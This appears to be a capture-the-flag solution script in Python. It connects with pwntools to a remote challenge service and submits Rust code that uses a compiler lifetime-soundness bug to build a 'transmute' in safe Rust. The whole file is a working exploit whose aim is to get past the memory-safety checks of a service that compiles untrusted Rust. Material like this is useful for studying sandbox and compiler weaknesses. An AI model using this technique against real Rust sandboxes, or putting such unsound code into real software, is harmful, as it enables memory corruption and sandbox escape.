#!/usr/bin/env python3
from pwn import *
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "localhost"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337

SOLUTION = r"""

pub fn lifetime_translator_mut<'a, 'b, T: ?Sized>(
	_val_a: &'a &'b (),
	val_b: &'b mut T,
) -> &'a mut T {
	val_b
}

pub fn expand_mut<'a, 'b, T: ?Sized>(x: &'a mut T) -> &'b mut T {
	let f: for<'x> fn(_, &'x mut T) -> &'b mut T = lifetime_translator_mut;
	f(STATIC_UNIT, x)
}


pub fn transmute<A, B>(obj: A) -> B {
	use core::hint::black_box;

	enum DummyEnum<A, B> {
		A(Option<Box<A>>),
		B(Option<Box<B>>),
	}

	fn transmute_inner<A, B>(dummy: &mut DummyEnum<A, B>, obj: A) -> B {
		let DummyEnum::B(ref_to_b) = dummy else {
		    loop {}
		};
		let ref_to_b = expand_mut(ref_to_b);
		*dummy = DummyEnum::A(Some(Box::new(obj)));
		black_box(dummy);

		*ref_to_b.take().unwrap()
	}

	transmute_inner(black_box(&mut DummyEnum::B(None)), obj)
}

pub const STATIC_UNIT: &&() = &&();

transmute::<In, Out>(input)
"""

r = remote(HOST, PORT)
r.recvuntil(b"EOF")
r.recvline()
r.sendline(SOLUTION.strip().encode())
r.sendline(b"EOF")
print(r.recvall(timeout=30).decode())
